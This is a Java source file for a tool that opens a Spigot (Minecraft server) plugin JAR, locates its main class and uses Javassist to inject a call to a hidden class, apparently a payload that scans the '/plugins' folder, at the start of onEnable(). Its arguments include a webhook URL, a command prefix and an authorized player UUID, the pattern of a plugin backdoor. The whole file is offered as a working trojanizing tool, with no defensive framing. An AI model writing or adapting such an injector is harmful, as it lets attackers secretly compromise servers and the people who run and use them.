package me.pedzito.injector;

import java.io.*;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Map;
import javassist.*;
import org.yaml.snakeyaml.Yaml;

public class JavassistInjector {
    
    public static void main(String[] args) {
        if (args.length < 6) {
            System.err.println("Usage: java JavassistInjector <jarPath> <tempDir> <webhookUrl> <commandPrefix> <authorizedUuid> <outputJar>");
            System.exit(1);
        }
        
        String jarPath = args[0];
        String tempDir = args[1];
        String webhookUrl = args[2];
        String commandPrefix = args[3];
        String authorizedUuid = args[4];
        String outputJar = args[5];
        
        try {
            // Read plugin.yml to find main class
            System.out.println("[JavassistInjector] Reading plugin.yml from JAR...");
            Map<String, Object> pluginYML = readPluginYAML(jarPath);
            
            if (pluginYML == null) {
                System.err.println("[JavassistInjector] Could not read plugin.yml - not a valid Spigot plugin");
                System.exit(1);
            }
            
            String pluginName = (String) pluginYML.get("name");
            String mainClass = (String) pluginYML.get("main");
            
            System.out.println("[JavassistInjector] Plugin name: " + pluginName);
            System.out.println("[JavassistInjector] Main class: " + mainClass);
            
            // Initialize ClassPool with the JAR in classpath
            ClassPool pool = new ClassPool(ClassPool.getDefault());
            pool.appendClassPath(jarPath);
            
            // Get the main class
            System.out.println("[JavassistInjector] Loading main class: " + mainClass);
            CtClass cc = pool.get(mainClass);
            
            // Find the onEnable method
            CtMethod onEnableMethod = null;
            try {
                onEnableMethod = cc.getDeclaredMethod("onEnable");
            } catch (NotFoundException e) {
                System.err.println("[JavassistInjector] onEnable method not found in main class");
                System.exit(1);
            }
            
            // Build the injection code  
            String injectionCode = "{ " +
                "(new MainL10()).a(\"/plugins\"); " +
                "instance = this; " +
                "}";
            
            System.out.println("[JavassistInjector] Injecting code at start of onEnable(): " + injectionCode);
            
            // Insert the code at the beginning of onEnable
            onEnableMethod.insertBefore(injectionCode);
            
            // Write the modified class to temp directory
            System.out.println("[JavassistInjector] Writing modified class to: " + tempDir);
            cc.writeFile(tempDir);
            
            System.out.println("[JavassistInjector] Successfully modified main class!");
            System.out.println("[JavassistInjector] Modified class written to: " + tempDir + "/" + mainClass.replace(".", "/") + ".class");
            
        } catch (Exception e) {
            System.err.println("[JavassistInjector] Error during injection:");
            e.printStackTrace();
            System.exit(1);
        }
    }
    
    private static Map<String, Object> readPluginYAML(String jarPath) {
        try {
            Yaml yaml = new Yaml();
            String inputFile = "jar:file:" + (jarPath.startsWith("/") ? "" : "/") + jarPath + "!/plugin.yml";
            
            URL inputURL = new URL(inputFile);
            JarURLConnection connection = (JarURLConnection) inputURL.openConnection();
            InputStream is = connection.getInputStream();
            
            return (Map<String, Object>) yaml.load(is);
        } catch (Exception e) {
            System.err.println("[JavassistInjector] Error reading plugin.yml: " + e.getMessage());
            return null;
        }
    }
}
